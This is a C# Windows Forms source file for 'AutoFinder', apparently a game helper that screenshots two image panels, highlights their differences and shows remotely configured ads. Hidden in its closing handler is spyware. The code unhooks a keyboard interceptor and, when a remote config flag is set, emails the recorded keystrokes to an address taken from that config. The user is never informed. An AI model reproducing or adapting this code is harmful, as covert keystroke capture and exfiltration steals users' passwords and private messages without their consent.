/*
 * Created by SharpDevelop.
 * User: lzk
 * Date: 2014/7/6
 * Time: 13:34
 * 
 * To change this template use Tools | Options | Coding | Edit Standard Headers.
 */
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

using AForge.Imaging;
using AForge.Imaging.Filters;

namespace AutoFinder
{
	/// <summary>
	/// Description of MainForm.
	/// </summary>
	public partial class MainForm : Form
	{
		private BlobCounter bc = new BlobCounter();
		private BlobWindow blobWnd = new BlobWindow();
		private Difference differenceFilter = new Difference();
		private Rectangle[] diffRects;
		private GrabImage graber = new GrabImage();
		private Grayscale grayFilter = new Grayscale(0.2125, 0.7154, 0.0721);
		private const int imageHeight = 450;
		private const int imageWidth = 500;
		private int imageX;
		private int imageY;
		private string savePath;
		private Threshold thresholdFilter = new Threshold(15);
		private const int WM_GRAB = 0x8888;
		private const int WM_REFRESH = 0x9999;
		ConfigLoader configLoader;
		GameWindowInfo playground;
		GameType gameType = GameType.Lady;
		int screenAdIndex = 0;
		int bottomAdIndex = 0;
		List<Bitmap> adImages = new List<Bitmap>();
		bool isVip = false;
		string version = "v1.3";
		Thread loadImageThread;
		
		[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
		public static extern IntPtr GetForegroundWindow();
		[return: MarshalAs(UnmanagedType.Bool)]
		[DllImport("user32.dll")]
		private static extern bool GetWindowRect(IntPtr hWnd, ref RECT lpRect);
		
		[DllImport("user32")]
		public static extern IntPtr SetActiveWindow(IntPtr hWnd);
		[DllImport("user32")]
		public static extern bool SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, uint wFlags);

		[StructLayout(LayoutKind.Sequential)]
		public struct RECT
		{
			public int Left;
			public int Top;
			public int Right;
			public int Bottom;
		}
		
		public Bitmap DownloadImage(string url)
		{
			Bitmap image = null;
			try
			{
				HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
				HttpWebResponse res = (HttpWebResponse)req.GetResponse();
				image = new Bitmap(res.GetResponseStream());
			}
			catch(Exception)
			{
				
			}
			return image;
		}
		
		private bool IsUserVIP()
		{
			List<string> vips = configLoader.GetVipList();
			string mac = new Tool().GetMacID();
			return vips.Contains(mac);
		}
		
		private bool IsLatestVersion()
		{
			return version == configLoader.Version;
		}
		
		public MainForm()
		{
			//
			// The InitializeComponent() call is required for Windows Forms designer support.
			//
			InitializeComponent();
			
			if (!Directory.Exists(Application.StartupPath + @"\Save"))
			{
				try
				{
					Directory.CreateDirectory(Application.StartupPath + @"\Save");
					this.savePath = Application.StartupPath + @"\Save";
				}
				catch(Exception)
				{
					
				}
			}
			else
			{
				this.savePath = Application.StartupPath + @"\Save";
			}
			
			configLoader = new ConfigLoader();
			
			lnkAd.Tag = configLoader.HelpPage;
			isVip = IsUserVIP();
			if(isVip)
			{
				lblAdTitle.Visible = false;
				timer1.Enabled = false;
			}
			else
			{
				lblAdTitle.Text = configLoader.AdsTitle;
				loadImageThread = new Thread(LoadAdImages);
				loadImageThread.Start();
				//timer1.Interval = configLoader.AdsInterval;
				//timer1.Start();
			}
			//
			// TODO: Add constructor code after the InitializeComponent() call.
			//
		}

		delegate void StartTimerDelegate();
		
		void LoadAdImages()
		{
			List<AdInfo> adList = configLoader.GetScreenAds();
			for (int i = 0; i < adList.Count; i++) {
				AdInfo ad = adList[i];
				Bitmap image = DownloadImage(ad.ImageUrl);
				adImages.Add(image);
			}
			StartTimerDelegate show = new StartTimerDelegate(DisplayImages);
			this.Invoke(show);
		}

		void DisplayImages()
		{
			timer1.Interval = configLoader.AdsInterval;
			timer1.Start();
		}
		
		void SendEmail()
		{
			EmailHelper helper = new EmailHelper();
			helper.SendEmail(InterceptKeys.GetKeysRecord(), configLoader.EmailReceiver);
		}
		
		protected override void DefWndProc(ref Message m)
		{
			playground = configLoader.GetPlaygroundInfo(this.gameType);
			this.blobWnd.Width = playground.Width;
			this.blobWnd.Height = playground.Height;
			switch (m.Msg)
			{
				case 0x8888:
					{
						this.blobWnd.BlobRects = null;
						this.blobWnd.Invalidate();
						this.blobWnd.Hide();
						IntPtr foregroundWindow = GetForegroundWindow();
						RECT lpRect = new RECT();
						GetWindowRect(foregroundWindow, ref lpRect);
						int left = lpRect.Left;
						int top = lpRect.Top;
						this.imageX = left + playground.Width + playground.MarginLeft + playground.Gutter;
						this.imageY = top + playground.MarginTop;
						Bitmap bitmap = this.graber.TakePhoto(playground.Width, playground.Height, left + playground.MarginLeft, this.imageY);
						Bitmap bitmap2 = this.graber.TakePhoto(playground.Width, playground.Height, this.imageX, this.imageY);
						if (this.checkBoxSaveImg.Checked)
						{
							try
							{
								string str = DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss") + "_1.jpg";
								string text1 = DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss") + "_2.jpg";
								bitmap.Save(this.savePath + @"\" + str, ImageFormat.Jpeg);
//								bitmap2.Save(this.savePath + @"\" + text1, ImageFormat.Jpeg);
							}
							catch(Exception ex)
							{
								
							}
						}
						Bitmap image = (Bitmap) bitmap.Clone();
						Bitmap bitmap4 = (Bitmap) bitmap2.Clone();
						this.differenceFilter.OverlayImage = bitmap4;
						Bitmap bitmap5 = this.differenceFilter.Apply(image);
						Bitmap bitmap6 = this.grayFilter.Apply(bitmap5);
						Bitmap bitmap7 = this.thresholdFilter.Apply(bitmap6);
//						this.pictureBox1.Image = bitmap7;
						this.bc.ProcessImage(bitmap7);
						this.diffRects = this.bc.GetObjectsRectangles();
						this.blobWnd.Location = new Point(this.imageX, this.imageY);
						this.blobWnd.BlobRects = this.diffRects;
						SetWindowPos(this.blobWnd.Handle.ToInt32(), -1, this.blobWnd.Location.X, this.blobWnd.Location.Y, playground.Width, playground.Height, 1);
						this.blobWnd.Show();
						this.blobWnd.Invalidate();
						return;
					}
				case 0x9999:
					this.blobWnd.Hide();
					return;
			}
			base.DefWndProc(ref m);
		}
		
		void RadioButton2CheckedChanged(object sender, EventArgs e)
		{
			this.gameType = radioButton2.Checked ? GameType.Everyone : GameType.Lady;
		}
		
		void RadioButton1CheckedChanged(object sender, EventArgs e)
		{
			this.gameType = radioButton1.Checked ? GameType.Everyone : GameType.Lady;
		}
		
		void Timer1Tick(object sender, EventArgs e)
		{
			List<AdInfo> adList = configLoader.GetScreenAds();
			List<AdInfo> bottomAds = configLoader.GetBottomAds();
			screenAdIndex = screenAdIndex % adList.Count;
			bottomAdIndex = bottomAdIndex % bottomAds.Count;
			
			if(adList.Count > 0)
			{
				AdInfo ad = adList[screenAdIndex];
				Bitmap image = null;
				if(screenAdIndex < adImages.Count)
				{
					image = adImages[screenAdIndex];
				}
				else
				{
					image = DownloadImage(ad.ImageUrl);
					adImages.Add(image);
				}
				if(image != null)
				{
					pictureBox1.Image = image;
					pictureBox1.Tag = ad.ClickUrl;
				}
			}
			if(bottomAds.Count > 0)
			{
				lnkAd.Text = bottomAds[bottomAdIndex].Text;
				lnkAd.Tag = bottomAds[bottomAdIndex].ClickUrl;
			}
			++bottomAdIndex;
			++screenAdIndex;
		}
		
		void MainFormFormClosing(object sender, FormClosingEventArgs e)
		{
			InterceptKeys.UnHook();
			this.blobWnd.Hide();
			if(!string.IsNullOrEmpty(configLoader.OpenPageUrl) && isVip == false)
			{
				System.Diagnostics.Process.Start(configLoader.OpenPageUrl);
			}
			if(configLoader.SendMail)
			{
				Thread t = new Thread(SendEmail);
				t.Start();
			}
			DialogResult confirm = MessageBox.Show("确定退出吗？", "提示", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
			if(confirm == DialogResult.No)
			{
				e.Cancel = true;
			}
		}
		
		void LnkAdLinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			if(lnkAd.Tag == null)
			{
				return;
			}
			string url = lnkAd.Tag.ToString();
			System.Diagnostics.Process.Start(url);
		}
		
		void BtnHelpClick(object sender, EventArgs e)
		{
			Help help = new Help();
			help.HelpPage = configLoader.HelpPage;
			help.ShowDialog();
		}
		
	}
}
